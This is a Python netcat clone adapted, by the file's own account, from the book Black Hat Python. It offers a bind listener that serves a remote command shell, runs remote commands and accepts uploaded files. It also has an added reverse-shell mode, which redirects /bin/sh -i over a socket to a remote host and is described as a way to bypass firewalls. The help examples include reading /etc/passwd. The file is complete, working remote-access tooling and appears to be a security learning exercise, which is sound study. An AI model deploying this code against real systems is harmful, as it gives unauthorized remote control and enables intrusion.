# -*-coding:Utf-8 -*

"""
this tool is a netcat clone in python3. All code came from blackhat python 2nd edition
See argparse help in main for usage.
my modifications:
- add doc strings for explainations
- moved class netcat out of main to allow import in another script
- remove default value for tagert and add required=True
- replacing args object by a dict argsDict ion classe netcat and converting args object in dict
- made correction to allow exit command
- corect execute function to catch errors
- add a reverse shell option
"""

import argparse
import os
import shlex
import socket
import subprocess
import sys
import textwrap
import threading


def manageArgs():
    """
    Argument management
    """
    parser = argparse.ArgumentParser(
        description='BHP Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example:
                    netcat.py -t 192.168.1.108 -p 5555 -l -c                     # command shell
                    netcat.py -t 192.168.1.108 -p 5555 -l -u mytest.txt          # upload to file
                    netcat.py -t 192.168.1.108 -p 5555 -l -e \"cat /etc/passwd\"   # execute command
                    echo 'ABC'|netcat.py -t 192.168.1.108 -p 135                 # echo text to server port 135
                    netcat.py -t 192.168.1.108 -p 5555                           # connect to server
                '''))
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port. 5555 by default.')
    parser.add_argument('-t', '--target', required=True, help='specified ip. required.')
    parser.add_argument('-u', '--upload', help='upload file')
    parser.add_argument('-r', '--reverse', action='store_true', help='Open a reverse shell on a remote machine')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose')
    return parser.parse_args()


def execute(cmd):
    """
    this func execute a command in local shell
    :param cmd: a string with the command to execute
    :return: command output or error returned by subprocess object
    """
    if not cmd:
        return
    cmd = cmd.strip()
    # we use subprocess for command execution and shelx to parse command to system
    # there is an issue here: cd .. return FileNotFoundError: [Errno 2] No such file or directory: 'cd ..'
    try:
        output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    except Exception as e:
        print(f'We got an error: {e}')
        output = bytes(str(e)+'\n', 'utf-8')
    finally:
        return output.decode('utf-8')


class Netcat:
    """
    This class allolw ntcat objetc creation. this object will manage server and client part.
    """
    def __init__(self, argsDict, buffer=None):
        """
        Init function of the class.
        :param argsDict: A dict for init with these fields:
            'command': True or false
            'execute'
            'listen': True or false
            'port'
            'target'
            'upload'
        :param buffer: if we send something, we wil provide a buffer with the something
        """
        try:
            assert ('command' in argsDict.keys())
            assert ('execute' in argsDict.keys())
            assert ('listen' in argsDict.keys())
            assert ('port' in argsDict.keys() and argsDict['port'] != None)
            assert ('target' in argsDict.keys() and argsDict['port'] != None)
            assert ('upload' in argsDict.keys())
        except AssertionError:
            raise ValueError('Need target ip and port to create this class of object!')
        self.argsDict = argsDict
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def close(self):
        """
        Method to close all socket
        """
        self.socket.shutdown(1)
        self.socket.close()

    def handle(self, client_socket):
        """
        The handler take the customer request and compute it as requested on server launch.
        If server was launched to execute a command and send back the result or if we want to open a shell.
        :param client_socket: a tcp client socket that receive/send informations from/to client
        """
        if self.argsDict['execute'] is not None:
            print('Running a program on server.')
            output = execute((self.argsDict['execute']))
            client_socket.send(output.encode('utf-8'))
            self.socket.close()
        elif self.argsDict['upload'] is not None:
            print('Uploading file on server.')
            file_buffer = b''
            while True:
                print('loop')
                data = client_socket.recv(4096)
                if data:
                    print('There is datas!')
                    file_buffer += data
                else:
                    print('No more datas!')
                    break

            with open(self.argsDict['upload'], 'wb') as f:
                f.write(file_buffer)
            message = f'File {self.argsDict["upload"]} saved!'
            client_socket.send(message.encode('utf-8'))
            self.socket.close()
        elif self.argsDict['command']:
            print('Starting server shell session.')
            cmdBuffErr = b''
            while True:
                try:
                    client_socket.send(b'BHP#: > ')
                    while '\n' not in cmdBuffErr.decode('utf-8'):
                        cmdBuffErr += client_socket.recv(4096)
                    if cmdBuffErr.decode('utf-8') == 'exit\n':
                        print('Shell ended by client.')
                        client_socket.close()
                        break
                    elif cmdBuffErr.decode('utf-8') == '\n':
                        print("Empty line sent.")
                    else:
                        print(f"For debug: {cmdBuffErr.decode('utf-8')}")
                        response = execute(cmdBuffErr.decode('utf-8'))
                        if response:
                            client_socket.send(response.encode('utf-8'))
                    cmdBuffErr = b''
                except Exception as e:
                    print(f'Server killed: {e}')
                    self.socket.close()
                    break
        else:
            print('Waiting a program.')
            buffer_str = ''
            buffer = ''
            while True:
                try:
                    buffer = client_socket.recv(4096).decode('utf-8')
                    sys.stdout.write(buffer)
                    buffer_str = input()
                    if buffer_str != 'exit':
                        buffer_str += "\n"
                        client_socket.send(buffer_str.encode('utf-8'))
                        sys.stdout.write("\033[A" + buffer.split("\n")[-1])
                    else:
                        break
                except Exception as e:
                    print(f'Server killed {e}')
                    self.socket.close()
                    sys.exit(1)

    def listen(self):
        """
        The listner is the method of server position: we will start to wait message froma customer
        """
        self.socket.bind((self.argsDict['target'], self.argsDict['port']))
        self.socket.listen(5)
        print('Listening start.')
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(target=self.handle, args=(client_socket,))
            client_thread.start()

    def reverseShell(self):
        """
        Open a reverse shell on target to bypass input firewalls
        """
        self.socket.connect((self.argsDict['target'], self.argsDict['port']))
        self.socket.send(b'Coucou!')
        # self.socket.close()
        while True:
            os.dup2(self.socket.fileno(), 0)
            os.dup2(self.socket.fileno(), 1)
            os.dup2(self.socket.fileno(), 2)
            process = subprocess.call(["/bin/sh", "-i"])

    def run(self):
        """
        The run method will execute object netcat as client or server (listen)
        """
        if self.argsDict['listen']:
            self.listen()
        elif self.argsDict['reverse']:
            self.reverseShell()
        else:
            self.send()

    def send(self):
        """
        This is the send method used when we are in customer position
        """
        self.socket.connect((self.argsDict['target'], self.argsDict['port']))
        if self.buffer:
            self.socket.send(self.buffer)
        # need to send an EOF (CTRL+D) before receiving things
        # self.socket.send('\x04'.encode('utf-8'))
        try:
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode('utf-8')
                    if recv_len < 4096:
                        break
                if response:
                    # print(response)
                    # buffer = input('> ')
                    # buffer += '\n'
                    buffer = input(response)
                    buffer += '\n'
                    self.socket.send(buffer.encode('utf-8'))
                    buffer = ''
        except KeyboardInterrupt:
            print('\nClient terminated.')
            self.socket.close()
            exit(0)


def main():
    """
    Main function
    """
    args = manageArgs()
    if args.listen:
        buffer = ''
    else:
        try:
            buffer = sys.stdin.read()
        except KeyboardInterrupt:
            print("\nNo more input!")
            exit(0)
    if not args.verbose:
        print("need to add something to disable logs")
    print(f'Options used:\n\t{vars(args)}')
    nc = Netcat(vars(args), buffer.encode('utf-8'))
    try:
        nc.run()
    except KeyboardInterrupt:
        print("\nClosing netcat.py!")
        nc.close()
        exit(0)


if __name__ == '__main__':
    main()

